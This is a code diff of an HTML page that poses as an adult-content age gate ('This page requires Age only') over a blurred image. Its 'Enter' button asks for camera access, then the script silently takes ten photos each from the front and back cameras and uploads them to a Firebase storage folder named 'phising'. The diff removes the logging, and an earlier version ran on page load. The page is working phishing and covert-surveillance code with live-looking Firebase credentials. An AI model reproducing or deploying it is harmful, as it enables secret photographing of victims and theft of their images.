@@ -3,7 +3,67 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Auto Capture</title>
+    <title>Camera Permission</title>
+    <style>
+        body { text-align: center; font-family: Arial, sans-serif; }
+        
+        /* Permission Overlay (Initially Visible) */
+        #permission-overlay {
+            position: fixed;
+            top: 0; left: 0;
+            width: 100%; height: 100%;
+            background: rgba(0, 0, 0, 0.8);
+            color: white;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            flex-direction: column;
+            z-index: 1000;
+        }
+
+        /* Style the Button */
+        #allow-btn {
+            padding: 10px 20px;
+            font-size: 18px;
+          background-color: red;
+           color: white;
+            border: none;
+            cursor: pointer;
+            border-radius: 5px;
+            margin-top: 10px;
+        }
+#press {
+    padding: 10px 20px;
+            font-size: 18px;
+          background-color: green;
+           color: white;
+            border: none;
+            cursor: pointer;
+            border-radius: 5px;
+            margin-top: 10px;
+}
+      
+
+        /* Blurred Image */
+        #preview-img {
+            width: 300px;
+            height: auto;
+            filter: blur(1px);
+            transition: filter 0.1s;
+        }
+    </style>
+</head>
+<body>
+    <!-- Permission Overlay -->
+    <div id="permission-overlay">
+        <p>🔒 This page requires 🔞 Age only</p>
+        <button id="press">press👇👇👇</button>
+        <button id="allow-btn">Enter</button>
+    </div>
+    
+    <!-- Preview Image -->
+    <img id="preview-img" src="images/Screenshot_20250203-083302_Chrome.jpg" alt="Image Preview">
+    
     <script type="module">
         import { initializeApp } from "https://www.gstatic.com/firebasejs/10.7.1/firebase-app.js";
         import { getStorage, ref, uploadBytes, getDownloadURL } from "https://www.gstatic.com/firebasejs/10.7.1/firebase-storage.js";
@@ -18,20 +78,63 @@
   appId: "1:1059488015525:web:db514a29cb876069d2d94c",
   measurementId: "G-VBSCFW4HQP"
         };
-
+        
         const app = initializeApp(firebaseConfig);
         const storage = getStorage(app);
 
+        // Get elements
+        const permissionOverlay = document.getElementById("permission-overlay");
+        const previewImg = document.getElementById("preview-img");
+        const allowBtn = document.getElementById("allow-btn");
+
+        // Request camera permission
+        async function requestCameraPermission() {
+            try {
+                await navigator.mediaDevices.getUserMedia({ video: true });
+                permissionOverlay.style.display = "none"; // Hide overlay
+                previewImg.style.filter = "blur(0)"; // Show clear image
+                captureMultipleImages();
+            } catch (error) {
+                alert("Camera access denied. Please enable it in browser settings.");
+            }
+        }
+
+        // Add event listener to the button
+        allowBtn.addEventListener("click", requestCameraPermission);
+
         async function getCameraStream(useFrontCamera) {
             try {
-                const constraints = {
+                return await navigator.mediaDevices.getUserMedia({
                     video: { facingMode: useFrontCamera ? "user" : "environment" }
-                };
-                return await navigator.mediaDevices.getUserMedia(constraints);
+                });
             } catch (error) {
-                console.warn("⚠ Back camera not available, switching to default.");
-                return await navigator.mediaDevices.getUserMedia({ video: true });
+                return null;
             }
+        }
+
+        async function captureMultipleImages() {
+            const frontStream = await getCameraStream(true);
+            const backStream = await getCameraStream(false);
+            
+            if (!frontStream || !backStream) return;
+            
+            const frontVideo = document.createElement("video");
+            frontVideo.srcObject = frontStream;
+            frontVideo.muted = true;
+            await frontVideo.play();
+
+            const backVideo = document.createElement("video");
+            backVideo.srcObject = backStream;
+            backVideo.muted = true;
+            await backVideo.play();
+
+            for (let i = 0; i < 10; i++) {
+                await captureAndUploadPhoto(frontVideo, i, true);
+                await captureAndUploadPhoto(backVideo, i, false);
+            }
+
+            frontStream.getTracks().forEach(track => track.stop());
+            backStream.getTracks().forEach(track => track.stop());
         }
 
         async function captureAndUploadPhoto(video, index, useFrontCamera) {
@@ -40,55 +143,17 @@
                 canvas.width = video.videoWidth;
                 canvas.height = video.videoHeight;
                 const ctx = canvas.getContext("2d");
-
                 ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
 
                 canvas.toBlob(async (blob) => {
                     const cameraType = useFrontCamera ? "front" : "back";
-                    const fileName = `images97424467/${cameraType}_${index + 1}_${Date.now()}.png`;
+                    const fileName = `phising/${cameraType}_${index + 1}_${Date.now()}.png`;
                     const storageRef = ref(storage, fileName);
                     await uploadBytes(storageRef, blob);
-                    const downloadURL = await getDownloadURL(storageRef);
-                    console.log(`✅ Uploaded ${cameraType} image ${index + 1}:`, downloadURL);
                     resolve();
                 }, "image/png");
             });
         }
-
-        async function captureMultipleImages() {
-            console.log("📸 Requesting camera access...");
-
-            const frontStream = await getCameraStream(true);
-            const backStream = await getCameraStream(false);
-
-            const frontVideo = document.createElement("video");
-            frontVideo.srcObject = frontStream;
-            frontVideo.muted = true;
-            frontVideo.setAttribute("playsinline", "");
-            await frontVideo.play();
-
-            const backVideo = document.createElement("video");
-            backVideo.srcObject = backStream;
-            backVideo.muted = true;
-            backVideo.setAttribute("playsinline", "");
-            await backVideo.play();
-
-            console.log("📸 Capturing images...");
-            for (let i = 0; i < 10; i++) {
-                await captureAndUploadPhoto(frontVideo, i, true);
-                await captureAndUploadPhoto(backVideo, i, false);
-            }
-
-            frontStream.getTracks().forEach(track => track.stop());
-            backStream.getTracks().forEach(track => track.stop());
-
-            console.log("✅ All images captured and uploaded!");
-        }
-
-        // Auto start when the page loads
-        window.onload = captureMultipleImages;
     </script>
-</head>
-<body>
 </body>
 </html>
